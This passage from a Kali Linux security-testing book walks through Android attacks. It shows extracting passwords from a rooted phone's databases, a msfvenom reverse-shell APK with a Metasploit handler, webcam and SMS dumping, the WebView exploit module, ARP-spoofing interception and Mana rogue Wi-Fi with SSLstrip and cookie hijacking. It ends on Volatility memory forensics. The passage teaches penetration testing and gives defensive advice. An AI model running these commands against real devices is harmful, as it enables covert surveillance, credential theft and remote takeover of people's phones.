 Type, “SELECT * FROM history;”

![](Images/image01026.jpeg)

Here we see all the websites that the user visited.

 Type, “.exit” to exit SQLite.

Let’s look at one of the other databases, webview.db is interesting:

![](Images/image01027.jpeg)

A “password” table, now that could hold some interesting information! What happens if we view it with the “Select” command?

 Type, “SELECT * FROM password;”

2|httpsaccounts.google.com|User|DonTHackMe

The user’s Google account password is “DonTHackMe” - Nice!

The Calendar Database - Appointment Information

The Database for “Calendar” can also contain some interesting information. This could give the attacker information about where you will be, who you will be with, and when. This is of special interest for a Social Engineer.

Open an Android shell again:

 Type, “./abd shell”

 Change to the “/data/data/com.android.providers.calendar/databases” directory:

![](Images/image01028.jpeg)

We can pull the calendar databases down in the same manner:

 Exit the adb shell

 Enter, “./adb pull /data/data/com.android.providers.calendar/databases”

![](Images/image01029.jpeg)

Now, let’s view the calendar database:

 Type, “./sqlite3 calendar.db”

 And then, “.tables” to list the available tables:

![](Images/image01030.jpeg)

On this Android device, the calendar events are located in the “view_events” table.

 Enter, “SELECT * FROM view_events;”

And we will see events with Time/ Date stamps:

1|Bake cookies|Bake cookies on back of old CRT monitor.|1415050200000|1415059200000

2|going on vacation|Bermuda Vacation!!!!|1415399400000|1416612600000

We can decode the Unix Timestamps to get the dates of the events:

The timestamps from “Event # 1, Bake cookies” translate to:

Monday, November 03, 2014 4:30:00 PM

Monday, November 03, 2014 7:00:00 PM

A silly example of course, but if a user roots their phone and a remote attacker is able to get access to it, they would be able to see exactly when they would be baking cookies, or other important things.

Take some time and look through the other program databases in the /data/data directory. You never know what you will find.

System Directory             

The hidden Data/ System directory also contains interesting information that we would only be able to access if the phone was rooted.

In the Android shell, change to the “/data/system” directory:

![](Images/image01031.jpeg)

Notice the “accounts.db” database listed above. Now, exit out of the shell and pull the accounts database:

 Type, “./adb pull /data/system/accounts.db”

 Open the database in Sqlite3

 And then list the tables:

![](Images/image01032.jpeg)

We can view the user accounts:

 Enter, “SELECT * FROM accounts;”

1|joeusernumber1@gmail.com|com.google|

The android device that I am using for this demo does not have a system password or PIN. But if it did, with access to the /Data/System directory, you could gain access to the PIN and even delete the Gesture Key file if one was present. For more information, see this very informative article on Infosec Institute:

[http://resources.infosecinstitute.com/android-forensics/](http://resources.infosecinstitute.com/android-forensics/)

Conclusion

Hopefully in this section we have learned the dangers of rooting your smart device. If an attacker were able to get remote access to a rooted device, he would have access to system files that would normally be protected. He could them view these files to see passwords and other important information.

Resources

 http://www.sqlite.org/cli.html

## Chapter 28

## Security Testing Android Devices

In this section we will discuss testing security on Android devices. We will use an Android device and our Kali Linux system. First we will see how to create a backdoored Android Application using Msfvenom and then we will look at one of Kali’s built in Website based exploits for Android.  For the most part you can use a phone or tablet interchangeably through this section, in most circumstances there really is no difference. If you do not have one you can use the Emulated AVD devices we created earlier. Though it does seem that since the initial drafts of this book all of the AVD devices have been patched against the website based exploit we will be using.

First up, let’s look at creating an Android Application that contains a remote shell with Msfvenom. This is great to try during security testing to see if you can social engineer your target into actually running and installing the app.

### Getting a Remote Shell on Android using Metasploit

This tutorial will consist of creating the backdoored Android app with Msfvenom and then creating a listening service in Metasploit to listen for the backdoor callback. Once the callback is made the listener creates a fully functional remote shell to the device.

But first some disclaimers - Though this technique will get you a full remote session on an Android device, please realize that Metasploit is a security testing platform, not a sole hacking platform. As such there are some steps you need to take prior to get this to work.

1.  Enable “Allow apps from unknown sources” on the phone. We are obviously not going to try to put our booby trapped .apk file in the Google store. So we must install the created app file via download or attachment. Thus you must enable “allow apps from unknown sources” in your phone’s security settings.
2.  Set the sleep setting on your phone to 5 minutes or more - When the phone sleeps, it cuts off the network connection thus killing the Meterpreter session.
3.  The Android device will warn you several times about installing the shell. These must be accepted before the app will install.
4.  Lastly, don’t use your everyday use phone for this! I highly recommend using a spare phone or tablet you use for testing or even use an emulated device created with the Android SDK.

### Creating a booby trapped APK file

First up, we need to create the APK that will include a remote shell. To do so, we will use the msfvenom command from Metasploit.

1.  In Kali Linux, open a terminal prompt and type:

msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.39 LPORT=4444 -o evilapp.apk

![](Images/image01033.jpeg)

The msfvenom command takes one of the meterpreter payloads and allows you to create a stand-alone file with it. You will need to put your Kali Linux IP address in for the LHOST address. You can change the port address also if you would like.

Once this is run, a file called “evilapp.apk” will be created.

2.  Now just send this file to your Android device, I used a Smart Phone in this instance. There are many ways to do this, you could send it in an e-mail, plug it in via USB and copy it. But for this example, I simply put the .apk file in the Kali 2 “/var/www/html” folder, started the apache server and downloaded it via the smartphone’s browser.

![](Images/image01034.jpeg)

3.  When the file is installing on the Android, it will come up like all apps and show you what capabilities it wants access to on your phone. It lists about every possibility I think, basically wanting total access to the phone. This should be a warning to users that this isn’t an app that they should be running!

![](Images/image01035.jpeg)

Now that the “evil” app is installed, we need to set Metasploit up to listen for incoming connections.

4.  In Kali, start Metasploit (msfconsole)
5.  Once Metasploit starts, type in the following to create a listener:

 use exploit/multi/handler

 set payload android/meterpreter/reverse_tcp

 set lhost 192.168.1.39

 set lport 4444

Then just type exploit to start the handler:

![](Images/image01036.jpeg)

6.  Run the App on your Android device. Mine showed up in the Apps list as the android robot with the name “Main Activity”.
7.  When you run the app, nothing seems to happen but as soon as it is pressed, your phone will connect out to the Metasploit system and a remote shell session is created.

On your Metasploit system you should see this:

![](Images/image01037.jpeg)

An active session is created and it drops you automatically into a meterpreter prompt.

8.  From here you can type “sysinfo” to get information on the device:

![](Images/image01038.jpeg)

9.  You can see the processes running by typing, “ps”:

![](Images/image01039.jpeg)

We can also run the shell command that will drop us into a direct Terminal shell if we want:

![](Images/image01040.jpeg)

You can surf around the Android device remotely by using standard Linux commands like “ls”, “pwd”, and “cd”. The Android phone in this example was not rooted, so I could not access the protected “/data/data” directory:

![](Images/image01041.jpeg)

You can type “exit” to get back to the meterpreter prompt. From here typing “help” will list all the commands that are available:

![](Images/image01042.jpeg)

Notice the last page of commands, the Webcam and Android commands. Let’s try these out!

### Webcam Commands

Type “webcam_list” and you will be presented with your device camera options. I have a front and rear camera, so it lists both:

1: Back Camera

2: Front Camera

Type “webcam_snap -h” to view the webcam snap options:

Usage: webcam_snap [options]

Grab a frame from the specified webcam.

OPTIONS:

    -h        Help Banner

    -i <opt>  The index of the webcam to use (Default: 1)

    -p <opt>  The JPEG image path (Default: 'Esbldlsb.jpeg')

    -q <opt>  The JPEG image quality (Default: '50')

    -v <opt>  Automatically view the JPEG image (Default: 'true')

So if we want to take a picture from the front camera:

 Type, “webcam_snap -i 2”

The phone will take a picture and then it will be displayed in Kali. This is what popped up on mine:

![](Images/image01043.jpeg)

Our new kitten sleeping! So basically if the target installs the booby trapped apk file, we could have full access to their camera. In secure environments this could be a major issue.

### Android Meterpreter Commands

There are several Android Commands in Meterpreter:

 check_root - Check if device is rooted

 dump_calllog - Get call log

 dump_contacts - Get contacts list

 dump_sms - Get sms messages

 geolocate - Get current lat-long using geolocation

The first command returns if the device is rooted or not:

![](Images/image01044.jpeg)

Let’s run the rest of the commands and see what they can do:

![](Images/image01045.jpeg)

The GeoLocate command didn’t work on mine (it was turned off on the phone) but the other commands did. Note that this phone was not rooted, but Metasploit was still able to pull the call list, contact list and all the SMS text messages from the phone! The reason that this was possible is that we allowed the app to install, even though it asked for permission to access all of these secure areas. Think about that for a moment.

Let’s take a look at what we were able to pull remotely from the phone. Here is a simulated sample:

root@kali:~# cat sms_dump_20150828182433.txt

=====================

[+] Sms messages dump

=====================

Date: 2015-08-28 18:24:34 -0400

OS: Android 4.4.4

Remote IP: 192.168.1.216

Remote Port: 54282

#1

Type              : Outgoing

Date              : 2015-08-10 10:15:42

Address              : (717) 305-1120

Status              : NOT_RECEIVED

Message              : We are in New York City!

#2

Type              : Incoming

Date              : 2015-08-10 24:10:32

Address              : 7172221919

Status              : NOT_RECEIVED

Message              : Perfect, get some pictures!

#3

Type              : Outgoing

Date              : 2015-08-10 25:22:34

Address              : (717) 305-1120

Status              : NOT_RECEIVED

Message              : Heck with that I found food!!!

Downloading Data

We can also use the Meterpreter “upload” and “download” commands to transfer data between Kali and the smart device. Let’s download a picture from the Android.

In Meterpreter I just surfed to the “/mnt/sdcard/Picture” directory (sometimes they are located in the DCIM directory) and looked for something interesting:

![](Images/image01046.jpeg)

There is a picture called “AlienSpider.jpg”, we must see what this is. Use the download command to pull the picture off of the device and save it to our desktop:

![](Images/image01047.jpeg)

Once it is saved locally, we just open it to see:

![](Images/image01048.jpeg)

A huge alien spider sunbathing in the Adirondack Mountains!

And that is it, one wrong app installed by a user and an attacker could get remote access to your phone or other Android device. By the way, the first time I ran this I was running a popular Android Anti-Virus program on the phone and it had no problems with letting my remote shell run.

In this tutorial we saw how to create a booby-trapped app and gain access to a remote phone when the user installed and executed it. The biggest safety move is to never install apps from unknown sources. Also, pay special attention to the rights and capabilities that a program wants when installing new apps. If a game wants full access to your phone, including the ability to make pay phone calls, and access to your messages, this should be a red flag. In the next section we will look at a common web exploit used against Android phones.

### Android Webview Exploit Tutorial

About a year ago, the big news in the Android world was a JavaScript exploit was found that a large number of Android devices were vulnerable to. It was said that around 70% of all Android devices in the field were possibly subject to this exploit and that it could allow an attacker remote access to your phone by doing nothing more than surfing to a malicious page or scanning in a malicious QR Code. The exploit, called the “Android WebView addJavascriptInterface Vulnerability” worked when untrusted JavaScript code was executed by a vulnerable WebView on some Android devices.

Shortly after the exploit was revealed an exploit module was added to Metasploit. In this tutorial we will take a look at it using Kali Linux and our target Android Device.

![](Images/image01049.jpeg)

1.  Type “msfconsole” at a terminal prompt.
2.  Enter, “use exploit/android/browser/webview_addjavascriptinterface”.
3.  Then type, “show options” to see what needs to be set:

![](Images/image01050.jpeg)

Now enter your LHOST and LPORT settings, we will also want to set the URIPATH variable. By default it is random, so I changed it to something easier to type in - “security” sounded reassuring.

 Type, “set LHOST 192.168.1.39”

 Enter, “set LPORT 4444”

 Then, “set URIPATH security”:

 And finally, type “exploit”:

![](Images/image01051.jpeg)

A server is started on the Kali system that hosts a webpage containing the exploit. A URL is provided including the URI path. Now if a vulnerable Android device surfs to our Metasploit module, sitting at 192.168.1.39:8080/security, we get a remote session:

![](Images/image01052.jpeg)

Now just connect to the session using “sessions -i 1″:

![](Images/image01053.jpeg)

And that is it! We are connected and as you can see, I have a complete remote shell to the Android device. All I had to do was visit a malicious page using the built in Browser and the exploit ran with no further warning or input from the Android device. To make matters worse, the URL could be printed as a QR Code so that once it is scanned, it automatically goes to the malicious page for true “click and pwn”.

Conclusion

So what can you do to protect yourself against these types of attack? In the Msfvenom backdoored application the best advice is to never install unsigned third party apps from third party locations. Watch the requested permissions carefully and if an app wants more permissions than are merited, do not install the application.

For the “Webview exploit”, the exploit only works on versions of Android < 4.2\. Though by now many Android devices have been patched against this, there may still be a large number of Android devices vulnerable to this attack. During testing I tried this against five android devices and only one was vulnerable.

An inherent problem with some Android devices seems to be getting updated patches for them. With multiple manufacturers and providers involved in the process, sometimes patches are not immediately available. And with some devices sitting on the store shelf for a long time, some devices need updating as soon as they are purchased.

## Chapter 29

## Man in the Middle & Wi-Fi Attacks against Android

As most Android devices have the capability to connect to Wi-Fi networks, they can be susceptible to Wireless man in the middle (MitM) attacks. They can also be vulnerable to multiple wireless protocol attacks like rogue routers and denial of service. As I have covered these types of attacks in my first book, “Basic Security Testing with Kali Linux”, I will not go into great detail other than to briefly show how some of these attacks would work against smartphones and tablets connected to Wi-Fi. For this section we will only be security testing the Android device through the Wi-Fi interface and not GSM/ CDMA/ LTE.

Introduction

A “Man in the Middle” attack or MitM is possible when an attacker inserts his system in between a user and the network. This is usually done by performing an ARP protocol attack. In essence the attacker uses a tool to trick the computer into thinking that he is the router and to trick the router into thinking that he is the user’s computer. In doing so, the attacker can view data as it is transferred back and forth from the user to the internet and vice versa.

![](Images/image01054.jpeg)

The picture above represents how normal communications work when a smart device is connected to the internet via Wi-Fi. The user’s device communicates with the router, which then communicates with the internet.

![](Images/image01055.jpeg)

The second picture represents a Man-in-the-Middle attack. The “evil hacker” is able to insert himself into the communication stream between the router and the user. All traffic from the user going to the internet goes through the hacker and all traffic coming back from the internet goes through the hacker before it is sent to the user. In this manner, the hacker is able to view all the incoming and outgoing traffic.

When in low reception areas, or when it is more advantageous to use Wi-Fi over the phone network (to transfer large files perhaps), users will turn on Wi-Fi and connect to local wireless routers. When they do, the Android device acts like any other computer that connects to the router and can be attacked by a hacker using wireless attacks. Android devices are also susceptible to Social Engineer type attacks that include rogue wireless routers and website spoofing.

### Man-in-the-Middle with ARPspoof

You can view the local IP address of the phone in the “Settings” section, on mine it was under “About Phone” and “Status”.  You can also find it in the Wireless Network settings. This of course wouldn’t make sense during a security test, as you most likely would not have physical access to the device. So in this case, nmap is our friend. 

 Run “nmap -sn 192.168.1.0/24” in a Kali Terminal:

(…. Simulated ….)

Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-08-30 14:14 GDT

Nmap scan report for Dlink 2927 (192.168.1.1)

Host is up (0.00091s latency).

Nmap scan report for android-JG23A580 (192.168.1.178)

Host is up (0.054s latency).

MAC Address: 00:41:92:3C:F2:78 (Unknown)

Nmap done: 256 IP addresses (10 hosts up) scanned in 10.64 seconds

In this scan we searched the entire Wi-Fi network and found an Android device sitting at 192.168.1.178\. Once we have the IP address of the device (a Tablet in this instance) we can setup the MitM attack.

1.  At a terminal prompt type, ”echo 1 > /proc/sys/net/ipv4/ip_forward”
2.  Next type, “arpspoof -i eth0 -t 192.168.1.178 192.168.1.1”

The “-i eth0” is your Ethernet interface. The “-t” is the target. Be sure to replace the IP addresses with your Android phone MAC address and your router address.

3.  Open a second terminal and type, “arpspoof -i eth0 -t 192.168.1.1 192.168.1.178”

Basically the same command, but the phone and router are reversed. These commands place your Kali system in between all traffic coming from your internet router to the target phone and all outgoing communication from your phone to the internet.

In both terminal windows you will see constant ARP replies:

(MAC Addresses) arp reply 192.168.1.178 is-at (attackers MAC Address)
(MAC Addresses) arp reply 192.168.1.1 is-at (attackers MAC Address)

4.  Now that we have that set, open a third terminal window and type, “urlsnarf -i eth0”

The “-i eth0” switch tells urlsnarf what interface to monitor, which is the main interface (eth0) in this case. Once this command is entered you will be able to see the websites visited by the target phone as seen below:

urlsnarf: listening on eth0 [tcp port 80 or port 8080 or port 3128]

android- JJ23A590 - - [30/Aug/2015:14:31:44 -0400] "GET http://www.google.com/webhp?client=tablet-unknown&source=android-home HTTP/1.1" - - "-" "Mozilla/5.0 (Linux; U; Android 2.2; en-us; Nexus One Build) Version/4.0 Mobile Safari/200.3"

As soon as the Android device visits a website it shows up on our Kali system. That is basically it, without ever touching the user’s phone/ tablet we are able to see exactly what the target is doing on the internet.

### TCP Dump and Wireshark

That was interesting, but we could also capture the traffic with a packet capture program and analyze it later. For example, let’s capture the traffic from the Android phone with “tcpdump” and view it in Wireshark.

1.  Hit, “Cntrl-c” to stop urlsnarf.
2.  To see tcpdump options type, “tcpdump -h”
3.  To start the capture, “tcpdump -i eth0 -w android.pcap”

The “-i” switch again lists the network interface that we want, “eth0”. And the “-w android.pcap” switch designates the name of the output file to create.

4.  Surf around on your phone’s internet browser.
5.  Press “Cntrl-c” to end packet capture.

![](Images/image01056.jpeg)

We now have a complete copy of the network traffic generated by the smart device saved as a file. Now just open the file (android.pcap) in Wireshark:

6.  In a Terminal type, “wireshark &” to start wireshark.
7.  Click “File”, then “Open” and select the android.pcap file.
8.  You can now view all the network traffic:

![](Images/image01057.jpeg)

With this you get to see every network packet that was transmitted between the Android device and the internet. From my network capture I noticed the simulated subject was performing a lot of internet searches. I wonder what they were looking up - Well, since we have all the traffic captured, we can find out!

9.  Select “File”, “Export Objects” and “HTTP” from the Wireshark menu.

A list of all the objects captured during the session will be listed. This will include scripts, pictures, videos, etc. Simply click one of the save buttons to save them to disk.

You can then view the saved artifacts:

![](Images/image01058.jpeg)

The picture above show the searches that our target performed. Obviously “cute puppies” were high on the search list. The artifact directory also showed all of the pictures returned from the searches (not shown). 

10.  Press “Cntrl-c” to end both arpspoof sessions and have it restore the original ARP tables.

Network Miner

Though it doesn’t come installed in Kali, one of my favorite packet analyzer programs is Network Miner. Network Miner takes packet captures and displays all the artifacts from them in an easy to use graphical interface.

Tool Author: NETRESEC AB

Tool Website:  [http://www.netresec.com/?page=NetworkMiner](http://www.netresec.com/?page=NetworkMiner)

It is a Windows program, but you can install it on Linux. As I already had it on my Windows host, I just used that version. You simply open the Android packet capture in Network Miner and it automatically separates the packets into easy to view topics. For example you can view every network site that the subject visited:

![](Images/image01059.jpeg)

You can also view all the data including downloads, messages, credentials, and of course any images viewed. Clicking on the “Images” tab shows a thumbnail shot of all the images viewed from the session. You can click on any one to see the full image:

![](Images/image01060.jpeg)

Obviously they were looking for cute kittens too!

This information was all intercepted from the Android device over the wireless network without ever physically touching the device.

### Rouge Wi-Fi Router Attacks with Mana

Tool Authors: Sensepost, Dominic White & Ian de Villiers

Tool Website:  [https://github.com/sensepost/mana](https://github.com/sensepost/mana)

Smart devices that use Wi-Fi are also vulnerable to Rogue Wi-Fi attacks. If we setup a rogue Wireless Router and the target connects to it, we can see everything the target is doing. And if you are running a program like Sensepost’s Mana you will even be able to see encrypted communication.

![](Images/image01061.jpeg)

Like other rogue Wi-Fi router programs Mana creates a rogue wireless router, but it is capable of so much more. Mana runs as a user defined access point, but it also listens for computers and mobile devices to beacon for preferred Wi-Fi networks, which it can then impersonate. Once someone connects to the rogue device, it automatically runs SSLstrip to downgrade secure communications to regular HTTP requests, and can bypass/redirect HSTS. This allows the attacker to view all session data. Mana also allows you to crack Wi-Fi passwords, grabs login sessions cookies and lets you impersonate these sessions with Firelamb.

But that is not all; it can also impersonate a captive portal and can simulate internet access in places where there is no access. See the tool website for more information and check out the creator’s Defcon 2014 Presentation:

[https://www.youtube.com/watch?v=szroUxCD13I](https://www.youtube.com/watch?v=szroUxCD13I)

Though not specifically made for Kali 2, Mana uses a lot of the tools already installed in Kali and works amazingly well. Though I did get some minor FireLamb errors when exiting the program.

Enough introductions, let’s see Mana in action:

1.  To install Mana, simply open a terminal and type, “apt-get install mana-toolkit”
2.  When install is complete, you can edit configuration settings in the “/etc/mana-toolkit/hostapd-karma.conf” file. It defaults to using a Wi-Fi adapter on Wlan0 and uses the rogue router name of “Internet”. If this is okay you don’t need to change anything.

That is it; you are pretty much all set to run Mana. All we need to do is run one of Mana’s program scripts located in “usr/share/mana-toolkit/run-mana”.

The scripts are:

 start-nat-simple.sh

 start-noupstream.sh

 start-nat-full.sh

 start-noupstream-eap.sh

For this tutorial let’s just run Mana’s main “nat-full” attack script.

3.  Attach a USB Wi-Fi card (a TL-WN722N works great) to Kali.
4.  Type “iwconfig” to be sure Kali sees it:

![](Images/image01062.jpeg)

5.  Change directory to “usr/share/mana-toolkit/run-mana”
6.  Type, “./start-nat-full.sh” to start Mana.

Mana then starts the rouge Wireless Router, SSLstrip and all the other needed tools and begins listening for traffic:

root@kali:/usr/share/mana-toolkit/run-mana#  ./start-nat-full.sh

hostname WRT54G

Current MAC:   23:23:04:45:67:2d (Bogus Wi-Fi Mac)

Permanent MAC: 23:23:04:45:67:2d (Bogus Wi-Fi Mac)

New MAC:       d4:76:b2:6f:21:87 (unknown)

Configuration file: /etc/mana-toolkit/hostapd-karma.conf

Using interface wlan0 with hwaddr 00:11:00:33:11:00 and ssid "Internet"

wlan0: interface state UNINITIALIZED->ENABLED

wlan0: AP-ENABLED

Internet Systems Consortium DHCP Server 4.3.1

Copyright 2004-2014 Internet Systems Consortium.

All rights reserved.

For info, please visit https://www.isc.org/software/dhcp/

Config file: /etc/mana-toolkit/dhcpd.conf

Database file: /var/lib/dhcp/dhcpd.leases

PID file: /var/run/dhcpd.pid

Wrote 0 leases to leases file.

Listening on LPF/wlan0/00:11:22:33:44:00/10.0.0.0/24

Sending on   LPF/wlan0/00:11:22:33:44:00/10.0.0.0/24

Sending on   Socket/fallback/fallback-net

/usr/share/mana-toolkit/sslstrip-hsts/sslstrip2

Generated RSA key for leaf certs.

Mana is fascinating to watch. Once someone connects, Mana will display and store any creds and cookies detected as the target surfs the web. You can also view Mana creating secure certificates on the fly to bypass secure communications.

7.  When done, press “Enter” to stop Mana. You may have to hit “cntrl-c” if it doesn’t respond after a while.
8.  To check what live login sessions you have captured run “firelamb-view.sh” to view captured authentication cookies:

[![Mana firelamb](Images/image01063.jpeg)](https://cyberarms.files.wordpress.com/2014/10/mana-firelamb.png)

This asks which session you want to try from the captured cookie sessions. It then tries to open the session in Firefox. If the user is still logged in you could take over their session. So if they logged into their e-mail account, you could possibly mirror their login and have access to their online e-mail account.

You can also review the log files manually in “/var/lib/mana-toolkit”. Viewing the log files I was able to see a clear text account login from my Android device:

2015-08-30 20:27:26,201 SECURE POST Data (login: --REDACTED--.com):

loginfmt=cyberarms%40&login=cyberarms&passwd=password

The first line shows what website the user logged in to and the second shows their username and password. This would have been normally done via encrypted https and not viewable. But Mana displays it in plain text.

Captive Portal

As mentioned earlier, Mana also comes equipped with a “Captive Portal” imitator. If you have ever used Wi-Fi at a fast food restaurant, hotel or “internet cafe” then you have seen a captive portal. A captive portal is a secure way to share internet with public users.

If you surf to the main Kali IP address in a browser, you will see that the default webpage has been changed. It now mimics a captive portal Wi-Fi login:

![](Images/image01064.jpeg)

The captive portal “allows” the target system access to the internet by asking them to first log in using the following popular options:

 Google

 Facebook

 Twitter

 Microsoft

 Local

Once they “login” with their credentials, Mana allows them to connect out to the internet.

Conclusion

In this section we learned that smart devices are susceptible to many of the same protocol and eavesdropping techniques as computers when they are used in Wi-Fi mode. I just touched on this topic quickly but as you can see, if the target is using Wi-Fi we can attack the device using standard MitM techniques to intercept and view their data. Using a program like Mana and SSLstrip, you will also be able to view encrypted data.

The best way to defend against this type of attack is to ensure that your Wireless router is properly secured using a long complex WPA2-PSK (AES) wireless key or use corporate encryption solutions. Make sure that your router firmware is up to date and that you use a long complex router admin password. Do not share your wireless key with anyone and do not post your key in a public location. You would be surprised how many times I have seen wireless passwords posted in a place that was visible to anyone in the office. Segment and monitor your networks. Finally, never trust open public Wi-Fi spots for business transactions, online shopping or banking. And remember hiding your router SSID or using MAC filtering will not stop a knowledgeable attacker.

Resources

 TCPdump website: [http://www.tcpdump.org/](http://www.tcpdump.org/)

 TCPdump Manual: [http://www.tcpdump.org/manpages/tcpdump.1.html](http://www.tcpdump.org/manpages/tcpdump.1.html)

 Wireshark website: [https://www.wireshark.org/](https://www.wireshark.org/)

 Wireshark Wiki: [http://wiki.wireshark.org/](http://wiki.wireshark.org/)

 Sensepost Mana: [https://github.com/sensepost/mana](https://github.com/sensepost/mana)

# Forensics

## Chapter 30

## Forensics Introduction

In this section we are going to take a look at Forensics from a computer security tester’s point of view. In doing so, we will not be covering the legalities of obtaining and handling evidence, nor will we talk about chain of custody, or proper documentation. We will simply be covering several of the tools available in Kali to perform different types of forensics in an attempt to recover information that may be useful in a security test situation, not a court case.

As such we will not be concerned with the normal forensics process of installing and using software or hardware write blockers or preparing and protecting the information recovered for a court case. If you plan on using Kali and its included tools for legal forensics cases then it is up to you to check federal, state, and local laws regarding evidence collection and also up to you to certify that the tools meet the requirements and capabilities to obtain and preserve legal evidence.

### Forensic Tools

We will cover how to use several of the most popular forensics tools fairly in depth, others we will just show the commands and how to execute them. Though beyond the scope of this book, there are some interesting PowerShell options available for forensics that are not included in Kali. Invok-ir.com’s PowerForensics is one such option:

[https://github.com/Invoke-IR/PowerForensics](https://github.com/Invoke-IR/PowerForensics)

### Analyzing Memory using Volatility

Disclaimer: The forensics chapters presented here are by no means meant for use in a real legal situation or to obtain or preserve evidence for an actual incident. The techniques presented here are not “forensically sound”.

Analyzing system memory for artifacts is a technique used by forensic analysts, security specialists and malware analysts. In this chapter we will take a look at one of the iconic memory analysis tools that is included in Kali Linux - Volatility. Though this will not be a thorough treatise on Volatility, we will see how to pull pertinent information from a memory dump and cover some very basic analysis with the tool.

You will learn how to grab a quick and easy dump of active memory, and how to recover the following information:

 Registry information

 Active process list

 Network connections

 Password hashes

We will also take a quick look at analyzing a system infected with malware.

### Obtaining a Memory Dump

There are several programs that can be used to obtain memory dumps. There are also several sources you can use for memory analysis.

Here are a few:

 Directly from Active Memory

 Virtual Memory file

 Hibernation Files

 Crash Dumps

 Remote Systems

In this tutorial we will go over recovering information directly from active memory and later recovering information from a virtual memory file.

In this section we will use one of the long time standbys, MoonSols “DumpIt” to capture the memory of our Windows 7 test VM. DumpIt is a very simple program to use, just run it and makes a copy of physical memory and then saves it into the current directory. You may want to surf around a bit on the Windows 7 VM; login to the Mutillidae hosted on it, etc. so there will be a lot of artifacts to recover.

1.  Simply download the DumpIt program:

[http://www.moonsols.com/2011/07/18/moonsols-dumpit-goes-mainstream/](http://www.moonsols.com/2011/07/18/moonsols-dumpit-goes-mainstream/)

2.  Put it on a USB drive or save it on your target system hard drive.
3.  Double click it, select yes twice and before you know it you have a complete copy of your machine’s memory sitting on disk!

![](Images/image01065.jpeg)

The only thing you need to make sure of, especially if using a USB drive is that it is large enough to hold the file that is created. The memory dump will be about the same size or a little larger than the size of your installed RAM. Go ahead and download DumpIt and obtain a memory dump of your Windows 7 VM. Sit back and take a break, this can take a while especially if the target system has a lot of RAM.

![](Images/image01066.jpeg)

Once we have the memory dump saved, we can now analyze it with Volatility.

![](Images/image01067.jpeg)

![](Images/image01068.jpeg)

Copy the resultant memory file over to our Kali system, placing it in a folder called “analysis” on the desktop.

### Analyzing a Memory Image with Volatility

Now that we have the memory dump .raw file transferred to Kali, let’s begin analyzing it. You can start Volatility from the Forensics menu, but it is just as easy to start it from the terminal.

 To see volatility’s options, enter “volatility -h”:

![](Images/image01069.jpeg)

To begin analysis, we need to obtain the image info. This can take a while to run if you have a large dump file. Enter the following command:

 volatility imageinfo -f  [memorydumpfilename.raw]

![](Images/image01070.jpeg)

The “Imageinfo” command gives you several pieces of information. “-f memorydumpfilename.raw” tells the command to use the memory capture file we just created. For now, we just need to know the profile type of the memory dump, in this case Win7SP1x86. We will use this in the next few steps.

Analyzing Registry Keys

Volatility includes multiple commands when dealing with the registry:

 Hivelist

 Hivedump

 Printkey

 Userassist

First we need the hive list so we can get the starting location of where the registry information resides.

Hivelist

 Enter, “volatility hivelist -f [memorydumpfilename.raw] --profile=Win7SP1x86”

“Hivelist” tells volatility to display the registry hive. And “--profile=Win7SP1x86” tells Volatility to use the Windows 7 SP1 x86 format when viewing the memory dump. Each memory dump stores data in different locations, so you  need to select the correct profile to match the target system.

![](Images/image01071.jpeg)

We now have a list of where several key items are located in the memory dump. We can use this information to find individual artifacts or we can just dump the entire hive list.

Hivedump

To do so, you simply need to use the “hivedump” command and the virtual memory address to the hive you want to view from the list recovered above. We will take a look at the Software hive, so we will use the virtual offset address of 0x8d31d650 (the hex# from the first column):

![](Images/image01072.jpeg)

 Enter, “volatility -f [memorydumpfilename.raw] --profile=Win7SP1x86 hivedump -o 0x8d31d650” filling in the correct values for your memory dump file and the virtual hex value for your SOFTWARE registry key.

This will dump the Software hive from the registry and print it out like the information below:

…\7-Zip

…\ATI Technologies

…\ATI Technologies\Install

…\ATI Technologies\Install\South Bridge

From this small snippet of the return, we see the user had 7 Zip installed and was using ATI Technologies software for his video card. Using hivedump will return a ton of registry settings, which is a lot more than we need. But you can also search the registry keys for specific data by using the ‘printkey -K "[Registry Key Location]"’ switch to access individual key information.

Printkey:

So if we wanted to recover the user names from the memory dump, we can access the SAM Names key:

 volatility --profile Win7SP1x86 -f [memorydumpfilename.raw] printkey -K "SAM\Domains\Account\Users\Names"

This returns the system user names:

![](Images/image01073.jpeg)

We can also find the name of the last logged in user by checking the “WinLogon” registry key:

 volatility --profile Win7SP1x86 -f [memorydumpfilename.raw] printkey -K "Software\Microsoft\Windows NT\CurrentVersion\Winlogon"

This returns information from a couple locations, but if we look near the bottom of the list we see:

![](Images/image01074.jpeg)

UserAssist

UserAssist is an interesting key that records what a user was running, how many times they ran it and when the last time the program was run.

 volatility --profile Win7SP1x86 -f [memorydumpfilename.raw] userassist

This also returns a lot of information, but as you look through it, you can find a very interesting report of the user’s activity:

![](Images/image01075.jpeg)

This sample shows that they ran Wordpad and then later ran DumpIt.exe from the E: drive twice.

Now that we have seen how to recover registry information, let’s take a look at recovering a list of the running processes and active network connections from the captured memory file. These steps are usually some of the first used for someone performing malware analysis on an image.

Process List

Using Volatility’s “pslist” command can be used to view the processes that were running on the Windows system:

 volatility pslist -f [memorydumpfilename.raw] --profile=Win7SP1x86

From the output of the command, we see the physical memory location, process name and the PID number of all process that were running. You can also use volatility to view the exact programs that may be running under the process. This helps malware analysts track down malicious processes and their associated programs. We will talk more on that later.

![](Images/image01076.jpeg)

DOS Command History

Another interesting command we can run is “cmdscan”. This plug-in allows us to see what commands, if any, were run from the command prompt.

 volatility cmdscan -f [memorydumpfilename.raw] --profile=Win7SP1x86

![](Images/image01077.jpeg)

It wasn’t very helpful in this case, but in some cases I have seen it list the step by step command lines that were entered during a DOS command line session. But it did capture that I had been using PowerShell and DumpIt from the command line. This information could be of benefit when analyzing a machine if you suspect the user was using DOS commands.

Viewing Network Connections with Netscan (and Connscan)

We can view the network connections that were active from the memory dump by using the “netscan” command (‘connscan’ is the Windows XP version of this command and is basically the same).

 volatility netscan -f [memorydumpfilename.raw] --profile=Win7SP1x86

![](Images/image01078.jpeg)

The data returned shows all network connections, including the process name, source and destination IP addresses – including ports. This is just a short snip of what was actually returned, the actual list is easily three times as long, because the user had several webpages open when the snapshot was taken.

This information helps the analyst see what network connections were active. But it can also help the security tester gain valuable information about the target network.

Internet History & Cache

Forensics investigators and security analyst can find interesting information from a user’s browsing history. Volatility’s “iehistory” command pulls internet explorer (and apparently some Firefox information as well) history usage from RAM and displays it.

